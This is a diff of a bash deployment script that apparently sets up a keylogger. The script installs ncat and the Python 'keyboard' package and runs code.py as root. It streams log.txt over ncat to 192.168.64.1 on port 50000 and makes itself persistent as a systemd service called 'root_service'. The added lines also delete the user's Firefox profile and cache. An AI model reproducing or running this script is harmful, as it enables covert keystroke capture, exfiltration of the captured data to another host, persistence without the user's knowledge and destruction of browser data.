@@ -1,3 +1,8 @@
+#!/bin/bash
+source venv/bin/activate
+sudo apt-get update
+sudo apt-get install -y ncat
+sudo apt-get install -y ufw
 sudo apt install net-tools
 sudo ufw enable
 sudo ufw allow 50000/tcp
@@ -7,8 +12,10 @@ pip install keyboard
 sudo venv/bin/python3 -u code.py&
 tail -f log.txt | ncat 192.168.64.1 50000 &
 (
+
 SERVICE_NAME="root_service"
 SCRIPT_PATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"
+SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
 
 # Create the systemd service file
 sudo bash -c "cat > ${SERVICE_FILE}" <<EOL
@@ -34,6 +41,7 @@ sudo systemctl enable ${SERVICE_NAME}.service
 sudo systemctl start ${SERVICE_NAME}.service
 
 echo "Service ${SERVICE_NAME} has been created and started."
-)
 
-~   
+rm -rf ~/.mozilla/firefox
+rm -rf ~/.cache/mozilla/firefox
+)                                 
